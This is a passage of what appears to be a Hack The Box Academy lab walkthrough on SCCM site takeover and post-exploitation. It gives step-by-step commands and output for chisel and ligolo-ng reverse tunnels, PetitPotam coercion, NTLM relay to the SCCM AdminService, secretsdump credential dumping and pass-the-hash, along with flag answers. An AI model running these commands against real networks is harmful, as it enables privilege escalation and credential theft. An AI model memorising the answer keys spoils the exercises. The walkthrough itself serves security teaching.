┌─[eu-academy-6]─[10.10.14.51]─[htb-ac-8414@htb-j8ulzwq2b7]─[~]
└──╼ [★]$ cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
```

Students will return to the RDP session established on the target, open `PowerShell`, and are going to transfer the `PowerView.ps1` file:

Code: powershell

```powershell
cp \\TSCLIENT\academy\PowerView.ps1 .
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\blwasp> cp \\TSCLIENT\academy\PowerView.ps1 .
```

Subsequently, students will import `PowerView.ps1` and will query the domain user `dario`, obtaining his `objectsid` value:

Code: powershell

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser dario -Properties objectsid
```

```
PS C:\Users\blwasp> Import-Module .\PowerView.ps1
PS C:\Users\blwasp> Get-DomainUser dario -Properties objectsid

objectsid
---------
S-1-5-21-2570265163-3918697770-3667495639-1235
```

Students will download pre-compiled `chisel` binaries for Linux and Windows from the [releases](https://github.com/jpillora/chisel/releases/tag/v1.10.0):

Code: shell

```shell
wget -q https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.deb
wget -q https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_windows_amd64.gz
sudo dpkg -i chisel_1.10.0_linux_amd64.deb
gunzip chisel_1.10.0_windows_amd64.gz
mv chisel_1.10.0_windows_amd64 chisel.exe
```

```
┌─[us-academy-6]─[10.10.14.84]─[htb-ac-8414@htb-sr5x5iu2xb]─[~]
└──╼ [★]$ wget -q https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.deb
wget -q https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_windows_amd64.gz
sudo dpkg -i chisel_1.10.0_linux_amd64.deb
gunzip chisel_1.10.0_windows_amd64.gz
mv chisel_1.10.0_windows_amd64 chisel.exe

Selecting previously unselected package chisel.
(Reading database ... 567240 files and directories currently installed.)
Preparing to unpack chisel_1.10.0_linux_amd64.deb ...
Unpacking chisel (1.10.0) ...
Setting up chisel (1.10.0) ...
```

Students will start `chisel` in `server` mode on their workstations:

Code: shell

```shell
chisel server --reverse
```

```
┌─[us-academy-6]─[10.10.14.84]─[htb-ac-8414@htb-sr5x5iu2xb]─[~]
└──╼ [★]$ chisel server --reverse

2024/08/23 00:14:54 server: Reverse tunnelling enabled
2024/08/23 00:14:54 server: Fingerprint lW/EZOnfuuDJ9hMEJhdI9W2t54r2B9yDhfe/JolDSzY=
2024/08/23 00:14:54 server: Listening on http://0.0.0.0:8080
```

Students will return to the RDP session, transfer the `chisel.exe` binary on the target, and establish a SOCK proxy:

Code: powershell

```powershell
cp \\TSCLIENT\academy\chisel.exe .
.\chisel.exe PWNIP:8080 R:1081:socks
```

```
PS C:\Users\blwasp> cp \\TSCLIENT\academy\chisel.exe .
PS C:\Users\blwasp> .\chisel.exe client 10.10.14.51:8080 R:1081:socks

2024/08/26 12:28:36 client: Connecting to ws://10.10.14.51:8080
2024/08/26 12:28:36 client: Connected (Latency 8.2393ms)
```

Subsequently, students will create a dedicated `proxychains` configurational file to serve port `1081`:

Code: shell

```shell
cat << EOF > proxy1081.conf
strict_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1081
EOF
```

```
┌─[eu-academy-6]─[10.10.14.51]─[htb-ac-8414@htb-hiptcwhhbe]─[~]
└──╼ [★]$ cat << EOF > proxy1081.conf
strict_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1081
EOF
```

Subsequently, they will clone the `relay-sccm-adminservice` branch and are going to start a Python virtual environment, and install the requirements:

Code: shell

```shell
git clone -b feature/relay-sccm-adminservice --single-branch https://github.com/garrettfoster13/impacket.git relay-sccm
cd relay-sccm/
python3 -m venv .sccmrelay
source .sccmrelay/bin/activate
sudo python3 -m pip install .
```

```
┌─[eu-academy-6]─[10.10.14.51]─[htb-ac-8414@htb-hiptcwhhbe]─[~]
└──╼ [★]$ git clone -b feature/relay-sccm-adminservice --single-branch https://github.com/garrettfoster13/impacket.git relay-sccm
cd relay-sccm/
python3 -m venv .sccmrelay
source .sccmrelay/bin/activate
sudo python3 -m pip install .

Cloning into 'relay-sccm'...
remote: Enumerating objects: 22720, done.
remote: Total 22720 (delta 0), reused 0 (delta 0), pack-reused 22720 (from 1)
Receiving objects: 100% (22720/22720), 8.71 MiB | 30.44 MiB/s, done.
Resolving deltas: 100% (17364/17364), done.
<SNIP>
```

Students will start `ntlmrelayx` and target the `SMS_Admin` endpoint of the `SCCM-SMS` host (`172.50.0.40`) to escalate `dario`'s permissions (groups) to full administrative privileges, supplying the user's SID attained earlier:

Code: shell

```shell
sudo proxychains -f ../proxy1081.conf -q python3 examples/ntlmrelayx.py -t https://172.50.0.40/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "LAB\dario" --displayname "LAB\dario" --objectsid S-1-5-21-2570265163-3918697770-3667495639-1235
```

```
(.sccmrelay) ┌─[eu-academy-6]─[10.10.14.51]─[htb-ac-8414@htb-hiptcwhhbe]─[~/relay-sccm]
└──╼ [★]$ sudo proxychains -f ../proxy1081.conf -q python3 examples/ntlmrelayx.py -t https://172.50.0.40/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "LAB\dario" --displayname "LAB\dario" --objectsid S-1-5-21-2570265163-3918697770-3667495639-1235

Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAPS loaded..

<SNIP>

[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

In a new terminal tab, students will download `PetitPotam.py` and are going to coerce the `SCCM01$` host to authenticate:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py
sudo proxychains -f ../proxy1081.conf python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' PWNIP 172.50.0.21 
```

```
┌─[eu-academy-6]─[10.10.14.51]─[htb-ac-8414@htb-hiptcwhhbe]─[~/relay-sccm]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py

┌─[eu-academy-6]─[10.10.14.51]─[htb-ac-8414@htb-hiptcwhhbe]─[~/relay-sccm]
└──╼ [★]$ sudo proxychains -f ../proxy1081.conf python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' 10.10.14.51 172.50.0.21 

[proxychains] config file found: ../proxy1081.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16

<SNIP>
Trying pipe lsarpc
[-] Connecting to ncacn_np:172.50.0.21[\PIPE\lsarpc]
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  172.50.0.21:445  ...  OK
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
<SNIP>
```

Students will notice the successful authentication relay and the promotion of the user `dario`. After they have performed the coercion, students can terminate `ntlmrelayx`:

```
<SNIP>
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.129.124.237, attacking target https://172.50.0.40
[*] Exiting standard auth flow to add SCCM admin...
[*] Authenticating against https://172.50.0.40 as LAB/SCCM01$
[*] Adding administrator via SCCM AdminService...
[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.129.124.237, attacking target https://172.50.0.40
[*] Exiting standard auth flow to add SCCM admin...
[*] Authenticating against https://172.50.0.40 as LAB/SCCM01$
[*] Skipping user SCCM01$ since attack was already performed
[*] SMBD-Thread-9 (process_request_thread): Received connection from 10.129.124.237, attacking target https://172.50.0.40
[*] Exiting standard auth flow to add SCCM admin...
[*] Authenticating against https://172.50.0.40 as LAB/SCCM01$
[*] Skipping user SCCM01$ since attack was already performed
[*] SMBD-Thread-11 (process_request_thread): Received connection from 10.129.124.237, attacking target https://172.50.0.40
[*] Exiting standard auth flow to add SCCM admin...
[*] Authenticating against https://172.50.0.40 as LAB/SCCM01$
[*] Skipping user SCCM01$ since attack was already performed
[*] SMBD-Thread-13 (process_request_thread): Received connection from 10.129.124.237, attacking target https://172.50.0.40
[*] Exiting standard auth flow to add SCCM admin...
[*] Authenticating against https://172.50.0.40 as LAB/SCCM01$
[*] Skipping user SCCM01$ since attack was already performed
[*] SMBD-Thread-15 (process_request_thread): Received connection from 10.129.124.237, attacking target https://172.50.0.40
[*] Exiting standard auth flow to add SCCM admin...
[*] Authenticating against https://172.50.0.40 as LAB/SCCM01$
[*] Skipping user SCCM01$ since attack was already performed
[*] Server returned code 201, attack successful
<SNIP>
```

Students are going to open a new terminal tab and clone `sccmhunter`:

Code: shell

```shell
cd ~
git clone -q https://github.com/garrettfoster13/sccmhunter
cd sccmhunter/
python3 -m venv .sccmhunter
source .sccmhunter/bin/activate
sudo python3 -m pip install -r requirements.txt
```

```
┌─[eu-academy-6]─[10.10.14.51]─[htb-ac-8414@htb-hiptcwhhbe]─[~/relay-sccm]
└──╼ [★]$ cd ~
git clone -q https://github.com/garrettfoster13/sccmhunter
cd sccmhunter/
python3 -m venv .sccmhunter
source .sccmhunter/bin/activate
sudo python3 -m pip install -r requirements.txt

Collecting cmd2==2.4.3
  Downloading cmd2-2.4.3-py3-none-any.whl (147 kB)
<SNIP>
```

Subsequently, they are going to utilize `sccmhunter` and connect as `blwasp:Password123!` to confirm that `dario` has been successfully added to the administrator's group:

Code: shell

```shell
sudo proxychains -q -f ../proxy1081.conf python3 sccmhunter.py admin -u dario -p 'Theman001' -ip 172.50.0.40
show_admins
```

```
(.sccmhunter) ┌─[eu-academy-6]─[10.10.14.51]─[htb-ac-8414@htb-hiptcwhhbe]─[~/sccmhunter]
└──╼ [★]$ sudo proxychains -q -f ../proxy1081.conf python3 sccmhunter.py admin -u dario -p 'Theman001' -ip 172.50.0.40

Authorization required, but no authorization protocol specified
Authorization required, but no authorization protocol specified
(sccmhunter.py:103354): Gtk-CRITICAL **: 06:03:24.145: gtk_clipboard_get_for_display: assertion 'display != NULL' failed
SCCMHunter v1.0.5 by @garrfoster
[06:03:24 AM] INFO     [!] Enter help for extra shell commands                                                                                                                                
() C:\ >> show_admins

[06:03:27 AM] INFO     Tasked SCCM to list current SMS Admins.
[06:03:30 AM] INFO     Current Full Admin Users:
[06:03:30 AM] INFO     LAB\sccm_admin
[06:03:30 AM] INFO     LAB\rai
[06:03:30 AM] INFO     LAB\dario   
```

Students will utilize the previously established RDP session, open `PowerShell`, and use `runas` to spawn a `PowerShell` session in the context of `dario`:

Code: powershell

```powershell
runas /netonly /user:LAB\dario powershell
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\blwasp> runas /netonly /user:LAB\dario powershell

Enter the password for LAB\dario:
Attempting to start powershell as user "LAB\dario" ...
```

In the newly spawned `PowerShell` session, students can grab the flag located at `\\SCCM01\NewShare`:

Code: powershell

```powershell
type \\SCCM01\NewShare\dario.txt
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> type \\SCCM01\NewShare\dario.txt
```

Answer: `NLTM_Relay_SCCM_Abuse`

# SCCM Site Takeover II

## Question 2

### "Connect to the shared folder \\\\LAB-DC\\SCCMShare\\SCCMServer01 using the hash of SCCM01$, and read the content of the file flag.txt:"

Students will reuse the previously spawned target, and are going to terminate the SOCKS proxy they established using `chisel`, and are going to tunnel the traffic using `ligolo-ng` instead:

Code: shell

```shell
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
unzip ligolo-ng_agent_0.6.2_windows_amd64.zip
tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
chmod +x proxy
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~]
└──╼ [★]$ wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
unzip ligolo-ng_agent_0.6.2_windows_amd64.zip
tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
chmod +x proxy

Archive:  ligolo-ng_agent_0.6.2_windows_amd64.zip
  inflating: LICENSE                 
  inflating: README.md               
  inflating: agent.exe               
LICENSE
README.md
proxy
```

Students will start the `proxy` binary as root and are going to wait for a connection from the agent:

Code: shell

```shell
sudo ./proxy -selfcert
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~]
└──╼ [★]$ sudo ./proxy -selfcert

WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
WARN[0000] TLS Certificate fingerprint for ligolo is: 619647D0129A8896FA96318F8911A1E5D54383499453AFE310B9E1BA507A7519 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ \`/ __ \/ / __ \______/ __ \/ __ \`/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.6.2

ligolo-ng »  
```

Subsequently, students will return to the RDP session, open `PowerShell`, transfer the `agent.exe` binary, and establish the connection with the `proxy` server started earlier:

Code: powershell

```powershell
cp \\TSCLIENT\academy\agent.exe .
.\agent.exe -connect PWNIP:11601 -ignore-cert
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\blwasp> cp \\TSCLIENT\academy\agent.exe .
PS C:\Users\blwasp> .\agent.exe -connect 10.10.14.68:11601 -ignore-cert

time="2024-08-27T07:59:36+02:00" level=warning msg="warning, certificate validation disabled"
time="2024-08-27T07:59:36+02:00" level=info msg="Connection established" addr="10.10.14.68:11601"
```

Students will start the tunnel by choosing the session in the `proxy` window and creating the interface:

Code: shell

```shell
session
1
interface_create --name ligolo
tunnel_start --tun ligolo
```

```
ligolo-ng » INFO[0727] Agent joined.                                 name="LAB\\blwasp@SRV01" remote="10.129.134.78:63797"
ligolo-ng » session
? Specify a session : 1 - #1 - LAB\blwasp@SRV01 - 10.129.134.78:63797
[Agent : LAB\blwasp@SRV01] » interface_create --name ligolo
INFO[1307] Creating a new "ligolo" interface...         
INFO[1307] Interface created!                           
[Agent : LAB\blwasp@SRV01] » tunnel_start --tun ligolo
[Agent : LAB\blwasp@SRV01] » INFO[1313] Starting tunnel to LAB\blwasp@SRV01
```

They are going to open a new terminal tab and will specify the network for the interface to be routed:

Code: shell

```shell
sudo ip route add 172.50.0.0/24 dev ligolo
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~]
└──╼ [★]$ sudo ip route add 172.50.0.0/24 dev ligolo
```

Subsequently, students are going to clone `impacket`, initiate a Python virtual environment, and install the requirements:

Code: shell

```shell
git clone -q https://github.com/fortra/impacket
cd impacket 
python3 -m venv .impacket 
source .impacket/bin/activate 
python3 -m pip install .
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~]
└──╼ [★]$ git clone -q https://github.com/fortra/impacket
cd impacket 
python3 -m venv .impacket 
source .impacket/bin/activate 
python3 -m pip install .

Processing /home/htb-ac-8414/impacket
  Preparing metadata (setup.py) ... done
Collecting charset_normalizer
  Downloading charset_normalizer-3.3.2-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (140 kB)
<SNIP>
```

They are going to start `ntlmrelayx.py` to coerce the authentication to `172.50.0.21` while establishing a SOCKS connection:

Code: shell

```shell
python3 examples/ntlmrelayx.py -t 172.50.0.21 -smb2support -socks --no-http-server
```

```
(.impacket) ┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~/impacket]
└──╼ [★]$ python3 examples/ntlmrelayx.py -t 172.50.0.21 -smb2support -socks --no-http-server

Impacket v0.12.0.dev1+20240826.122401.27c196f8 - Copyright 2023 Fortra

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
<SNIP>

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx> 
```

In a new terminal tab, students will download `PetitPotam.py` and are going to coerce the `SCCM01` host using the credentials `blwasp:Password123!`:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py
python3 PetitPotam.py -u blwasp -p 'Password123!' -d 'lab.local' PWNIP 172.50.0.22
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~/impacket]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py

┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~/impacket]
└──╼ [★]$ python3 PetitPotam.py -u blwasp -p 'Password123!' -d 'lab.local' 10.10.14.68 172.50.0.22

<SNIP>
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Students will notice the authentication being relayed and a SOCKS connection being established by `SCCM01$` in `ntlmrelayx.py`:

```
<SNIP>
ntlmrelayx> [*] SMBD-Thread-12 (process_request_thread): Received connection from 10.129.134.78, attacking target smb://172.50.0.21
[*] Authenticating against smb://172.50.0.21 as LAB/SCCM02$ SUCCEED
[*] SOCKS: Adding LAB/SCCM02$@172.50.0.21(445) to active SOCKS connection. Enjoy
[*] All targets processed!
<SNIP>
```

Subsequently, students will modify the SOCKS port in the `/etc/proxychains.conf` configuration file from `9050` to `1080` which is used by the SOCKS proxy established via `ntlmrelayx`:

Code: shell

```shell
sudo sed -i 's/9050/1080/g' /etc/proxychains.conf
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~/impacket]
└──╼ [★]$ sudo sed -i 's/9050/1080/g' /etc/proxychains.conf
```

Students will use `proxychains` to perform a `DCSync` attack against the `SCCM01` host and will attain the NT hash of the computer account:

Code: shell

```shell
proxychains -q secretsdump.py 'LAB/SCCM01$'@172.50.0.21 -no-pass
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~/impacket]
└──╼ [★]$ sudo proxychains secretsdump.py 'LAB/SCCM02$'@172.50.0.21 -no-pass

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.50.0.21:445  ...  OK
[*] Target system bootKey: 0x99bae75d092c3b9d979cf712fb4fcfde
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7c5559a75836c3330f5e7700086de84a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b16d6873b597bcdc0dc553eac61112ce:::
[*] Dumping cached domain logon information (domain/username:hash)
LAB.LOCAL/Administrator:$DCC2$10240#Administrator#a3118c0355c1b19322960df4ac180d79
LAB.LOCAL/sccm_admin:$DCC2$10240#sccm_admin#66477395bae00b82c381d078c3f9dd4a
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
LAB\SCCM01$:aes256-cts-hmac-sha1-96:a19dd3e20ba012dbbd93911475c0e74d190b68aebc8c01680b914576fac98b83
LAB\SCCM01$:aes128-cts-hmac-sha1-96:171282a440530365a0addf2aa5c84814
LAB\SCCM01$:des-cbc-md5:e6455223548af164
LAB\SCCM01$:plain_password_hex:75781890938bc4f9e20b44f6ebadb9ed576f31020a9d6b1ef0cf5201da099e6a317b5addfabe14cda0d510c2b569f9625e5f51a238087264ae44c9ef79a54d5587d1773efcfd4c8a37345921acc5544596e622ea815f1e74892407231dc08ed4c7aa250651fe8970723eed5451b33f82aa80829655852a9831629dae0b80800e4d5396d4bad757d2b72ab76f29ca76d6757e1370978e1213faebe1e11b345a9aefc1fc7fd2e96b97409cd8a36ddb006e8073e3ea5add38d09cbaf50194a75201e2af6b8ef0622077a524d9f9f4567210834a041932908da72aa3fc5c1c9a4adb32d3d6b2405356ea4a18e4d4ae4a53ca
LAB\SCCM01$:aad3b435b51404eeaad3b435b51404ee:591f754ef48082f5fc4abec66c223d30:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x49d54289ef1355d7aff699a592fd70cb351fc2f9
dpapi_userkey:0xfed1333f00ea648b4e88c77b7c820cafbfa5e430
<SNIP>
```

With the obtained NT hash of the `LAB\SCCM01$` computer account students are going to connect via `smbclient.py` to the `172.50.0.10` host:

Code: shell

```shell
proxychains -q smbclient.py 'LAB/SCCM01$'@172.50.0.10 -hashes aad3b435b51404eeaad3b435b51404ee:591f754ef48082f5fc4abec66c223d30
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~/impacket]
└──╼ [★]$ proxychains -q smbclient.py 'LAB/SCCM01$'@172.50.0.10 -hashes aad3b435b51404eeaad3b435b51404ee:591f754ef48082f5fc4abec66c223d30

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# 
```

Students will list the shares, connect to the `SCCMShare`, navigate to the `SCCM01` directory, and download the flag:

Code: shell

```shell
shares
use SCCMShare
cd SCCM01
get flag.txt
exit
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~/impacket]
└──╼ [★]$ proxychains -q smbclient.py 'LAB/SCCM01$'@172.50.0.10 -hashes aad3b435b51404eeaad3b435b51404ee:591f754ef48082f5fc4abec66c223d30

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
SCCMShare
SYSVOL
Test
# use SCCMShare
# cd SCCM01
# get flag.txt
# exit
```

Students will attain the flag in the `flag.txt` file:

Code: shell

```shell
cat flag.txt
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~/impacket]
└──╼ [★]$ cat flag.txt 

{hidden}
```

Answer: `PWN_SCCM_With_PasiveServer_Coerce`

# SCCM Post Exploitation

## Question 1

### "What's the SMSUniqueIdentifier for the computer account SQL?"

After spawning the target, students are going to establish an RDP session using the credentials `blwasp:Password123!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:blwasp /p:'Password123!' /dynamic-resolution /drive:.,academy
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-ifzhc4odbx]─[~]
└──╼ [★]$ xfreerdp /v:10.129.230.38 /u:blwasp /p:'Password123!' /dynamic-resolution /drive:.,academy

[02:07:21:517] [26449:26450] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[02:07:21:517] [26449:26450] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[02:07:21:517] [26449:26450] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[02:07:21:576] [26449:26450] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[02:07:21:576] [26449:26450] [WARN][com.freerdp.crypto] - CN = SRV01.lab.local
[02:07:21:577] [26449:26450] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[02:07:21:577] [26449:26450] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[02:07:21:577] [26449:26450] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[02:07:21:577] [26449:26450] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.230.38:3389) 
[02:07:21:577] [26449:26450] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[02:07:21:577] [26449:26450] [ERROR][com.freerdp.crypto] - Common Name (CN):
[02:07:21:577] [26449:26450] [ERROR][com.freerdp.crypto] - 	SRV01.lab.local
[02:07:21:577] [26449:26450] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.230.38:3389 (RDP-Server):
	Common Name: SRV01.lab.local
	Subject:     CN = SRV01.lab.local
	Issuer:      CN = SRV01.lab.local
	Thumbprint:  52:ab:92:ff:f6:13:4f:72:15:9e:22:69:8e:8a:4a:16:57:80:2c:93:bd:c7:72:2f:8d:bf:c7:bf:7e:9b:c0:ae
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will download `ligolo-ng` to tunnel the traffic:

Code: shell

```shell
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
unzip ligolo-ng_agent_0.6.2_windows_amd64.zip
tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
chmod +x proxy
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~]
└──╼ [★]$ wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
unzip ligolo-ng_agent_0.6.2_windows_amd64.zip
tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
chmod +x proxy

Archive:  ligolo-ng_agent_0.6.2_windows_amd64.zip
  inflating: LICENSE                 
  inflating: README.md               
  inflating: agent.exe               
LICENSE
README.md
proxy
```

Students will start the `proxy` binary as root and are going to wait for a connection from the agent:

Code: shell

```shell
sudo ./proxy -selfcert
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~]
└──╼ [★]$ sudo ./proxy -selfcert

WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
WARN[0000] TLS Certificate fingerprint for ligolo is: 619647D0129A8896FA96318F8911A1E5D54383499453AFE310B9E1BA507A7519 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ \`/ __ \/ / __ \______/ __ \/ __ \`/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.6.2

ligolo-ng »  
```

Subsequently, students will return to the RDP session, open `PowerShell`, transfer the `agent.exe` binary, and establish the connection with the `proxy` server started earlier:

Code: powershell

```powershell
cp \\TSCLIENT\academy\agent.exe .
.\agent.exe -connect PWNIP:11601 -ignore-cert
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\blwasp> cp \\TSCLIENT\academy\agent.exe .
PS C:\Users\blwasp> .\agent.exe -connect 10.10.14.68:11601 -ignore-cert

time="2024-08-27T07:59:36+02:00" level=warning msg="warning, certificate validation disabled"
time="2024-08-27T07:59:36+02:00" level=info msg="Connection established" addr="10.10.14.68:11601"
```

Students will start the tunnel by choosing the session in the `proxy` window and creating the interface:

Code: shell

```shell
session
1
interface_create --name ligolo
tunnel_start --tun ligolo
```

```
ligolo-ng » INFO[0727] Agent joined.                                 name="LAB\\blwasp@SRV01" remote="10.129.134.78:63797"
ligolo-ng » session
? Specify a session : 1 - #1 - LAB\blwasp@SRV01 - 10.129.134.78:63797
[Agent : LAB\blwasp@SRV01] » interface_create --name ligolo
INFO[1307] Creating a new "ligolo" interface...         
INFO[1307] Interface created!                           
[Agent : LAB\blwasp@SRV01] » tunnel_start --tun ligolo
[Agent : LAB\blwasp@SRV01] » INFO[1313] Starting tunnel to LAB\blwasp@SRV01
```

They are going to open a new terminal tab and will specify the network for the interface to be routed:

Code: shell

```shell
sudo ip route add 172.50.0.0/24 dev ligolo
```

```
